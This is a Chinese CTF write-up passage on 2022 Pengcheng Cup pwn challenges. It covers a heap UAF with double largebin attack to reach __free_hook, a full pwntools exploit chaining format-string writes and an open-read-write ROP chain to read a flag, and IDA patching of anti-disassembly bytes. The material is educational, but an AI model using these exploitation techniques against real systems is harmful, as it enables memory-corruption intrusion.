<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>漏洞是delete里的UAF，另外限制了malloc大小在<code>size &lt;= 0x40F || size &gt; 0x5F8</code>这个范围里，</p>
<p>菜单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_B32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Edit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Show&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.Delete&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;5.Exit&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>add功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !Heap[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Input size:&quot;</span>);</span><br><span class="line">      size = sub_BFD();</span><br><span class="line">      <span class="keyword">if</span> ( size &lt;= <span class="number">0x40F</span> || size &gt; <span class="number">0x5F8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Size error!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        Size[i] = size;</span><br><span class="line">        Heap[i] = <span class="built_in">malloc</span>(Size[i]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>show功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input index:&quot;</span>);</span><br><span class="line">  v1 = sub_BFD();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">31</span> || !Heap[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">  sub_B75(*Heap[v1]);</span><br><span class="line">  <span class="keyword">return</span> sub_B75(*(Heap[v1] + <span class="number">4LL</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>里面用到的加密函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_B75</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">10</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">    a1 ^= ((a1 ^ (<span class="number">0x30</span> * a1)) &gt;&gt; <span class="number">0x15</span>) ^ (<span class="number">0x30</span> * a1) ^ ((a1 ^ (<span class="number">0x30</span> * a1) ^ ((a1 ^ (<span class="number">0x30</span> * a1)) &gt;&gt; <span class="number">0x15</span>)) &lt;&lt; <span class="number">17</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h5 id="z3解show部分的加密"><a href="#z3解show部分的加密" class="headerlink" title="z3解show部分的加密"></a>z3解show部分的加密</h5><h4 id="pwn部分"><a href="#pwn部分" class="headerlink" title="pwn部分"></a>pwn部分</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">0x450</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">0x440</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)	<span class="comment">#leak libc</span></span><br><span class="line">show(<span class="number">2</span>)	<span class="comment">#leak heap</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">0x410</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x460</span>) <span class="comment">#1 into largebin</span></span><br><span class="line">edit(<span class="number">1</span>,p64(main_arena)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0x90</span> - <span class="number">0x20</span>))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x460</span>) <span class="comment">#largebin attack</span></span><br><span class="line">add(<span class="number">0x440</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(main_arena)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(mp_ + <span class="number">0x50</span> - <span class="number">0x20</span>))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x460</span>) <span class="comment">#largebin attack</span></span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x430</span>) <span class="comment">#10 =&gt; free_hook</span></span><br></pre></td></tr></table></figure>

<p>通过两次largebin_attack来分别劫持<code>mp.tcache_bins</code>和在对应的<code>tcache-&gt;counts[tc_idx]</code>里写值，从而把<code>__free_hook</code>申请出来。剩下的orw部分很常规就不贴了</p>
<h2 id="one"><a href="#one" class="headerlink" title="one"></a>one</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">2056</span>]; <span class="comment">// [rsp+0h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>, s);</span><br><span class="line">  login();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, you can&#x27;t see anything!!!&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;username:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;password:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序主体就这么些内容，保护全开，加了沙箱把execve跟execveat给禁了，所以orw。</p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>复现时的思路参考了<a target="_blank" rel="noopener" href="https://kagehutatsu.com/?p=711">影二つ</a>师傅的博客</p>
<p>一个printf给了一个栈地址，然后在login中能泄漏一个程序地址</p>
<p>劫持格式化字符串printf的返回地址为start，跳两次start之后<code>_IO_2_1_stdout_</code>的指针残留在栈上，利用该指针把fileno改成2重新获得输出（这里需要爆破半个字节），泄漏libc之后就可以正常orw了，一个比较简单的orw方法是将printf的返回地址劫持成<code>add_rsp_ret</code>，因为read能在栈上输入0x200个字节，所以足够写完orw chain，再把rsp抬到orw chain的位置就可以正常执行了。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;name:&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;word&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">pgm = u64(p.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x11a0</span></span><br><span class="line">start = pgm + <span class="number">0x11A0</span></span><br><span class="line"></span><br><span class="line">b = ((start&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)+<span class="number">0x100</span>-<span class="number">0xA0</span></span><br><span class="line">payload = <span class="string">b&#x27;%160c%10$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(b).encode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&#x27;c%11$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Now, you can&#x27;t see anything!!!&quot;</span>,payload)</span><br><span class="line"><span class="comment">#read = 148C</span></span><br><span class="line"><span class="comment">#p_ret = 14BE</span></span><br><span class="line"><span class="comment">#p_ret = stack - 0x8</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">b = ((start&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)+<span class="number">0x100</span>-<span class="number">0xA0</span></span><br><span class="line">payload = <span class="string">b&#x27;%160c%10$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(b).encode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&#x27;c%11$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x908</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x907</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">a = ((stack-<span class="number">0x910</span>)&amp;<span class="number">0xff</span>)-<span class="number">0x50</span>+<span class="number">0x100</span></span><br><span class="line">b = <span class="number">0x28c</span> - a</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(a).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%11$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(b).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1208</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x910</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">a = ((stack-<span class="number">0x910</span>)&amp;<span class="number">0xff</span>)-<span class="number">0x50</span>+<span class="number">0x100</span>+<span class="number">1</span></span><br><span class="line">b = a-<span class="number">140</span></span><br><span class="line">payload = <span class="string">b&#x27;%16c%292$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%124c%11$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(b).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%12$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1208</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x910</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%23c%292$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%117c%11$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1208</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%2c%282$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%138c%11$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%265$p&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1208</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - (<span class="number">0x7ffff7dc8083</span> - <span class="number">0x7ffff7da4000</span>)</span><br><span class="line">add_rsp = <span class="number">0x0000000000024242</span> + libc_base</span><br><span class="line"><span class="comment">#add rsp 0x98</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000002601f</span> + libc_base</span><br><span class="line">pop_rdi = <span class="number">0x0000000000023b6a</span> + libc_base</span><br><span class="line">pop_rdx = <span class="number">0x0000000000142c92</span> + libc_base</span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">flag_addr = stack - <span class="number">0x1200</span> + <span class="number">0x90</span></span><br><span class="line">orw = <span class="string">b&#x27;flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">orw += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(ope)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(stack) + p64(pop_rdx) + p64(<span class="number">0x20</span>) + p64(read)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">2</span>) + p64(pop_rsi) + p64(stack) + p64(pop_rdx) + p64(<span class="number">0x20</span>) + p64(write)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x14B9)&#x27;)</span></span><br><span class="line">a = add_rsp&amp;<span class="number">0xffff</span></span><br><span class="line">b = ((add_rsp&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-a+<span class="number">0x10000</span></span><br><span class="line">c = ((add_rsp&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>)-a-b+<span class="number">0x20000</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(a).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%12$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(b).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(c).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%14$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1208</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1206</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1204</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += orw</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pop_rdi))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="rainbow-cat"><a href="#rainbow-cat" class="headerlink" title="rainbow_cat"></a>rainbow_cat</h2><p>版本：glibc-2.33</p>
<h3 id="修复程序"><a href="#修复程序" class="headerlink" title="修复程序"></a>修复程序</h3><p>刚拿到的程序无法直接进行反汇编，原因是其中加入了很多混淆的数据，如下</p>
<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-1.jpg" class>

<p>这条jz指令会让程序跳到<code>0xA64 + 2</code>处执行指令，而<code>[0xA64,0xA64 + 2]</code>之间就加入了两个字节的混淆数据，IDA在识别程序的时候会把这两个字节也当作是指令，但是实际上由于jz的跳转，这两个字节实际上是会被跳过的，这样就达到了不影响程序执行逻辑的前提下让IDA的反汇编出现问题。</p>
<p>解决办法也很简单，在知道这中间的两个字节是无用的之后只需要将其patch成nop即可，首先在<code>0xA64</code>处按<code>D</code>将其转成数据</p>
<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-2.jpg" class>

<p>然后patch成nop</p>
<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-3.jpg" class>

<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-4.jpg" class>

<p>然后按<code>C</code>重新转成代码</p>
<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-5.jpg" class>

<p>但是程序在最开始反汇编失败的时候，反编译失败的那部分代码会是红色的，这时我们patch完之后想反汇编的话还需要把红色的那部分代码给选中然后按<code>C</code>，选<code>Analyze</code>分析，然后再单击选中要反汇编的地址按<code>P</code>即可，完成之后就可以正常显示反汇编代码了</p>
<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-6.jpg" class>

<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-7.jpg" class>

<p>可能修复完之后还是会有一点小问题，但是能看懂程序主逻辑就行了</p>
<h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>首先是add</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which cat do you want to get? &quot;</span>);</span><br><span class="line">  index = (read_choice)();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( (ptr &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL) != qword_203168 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;The cat don&#x27;t like you!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    heap[index] = ptr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can&#x27;t get this one&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

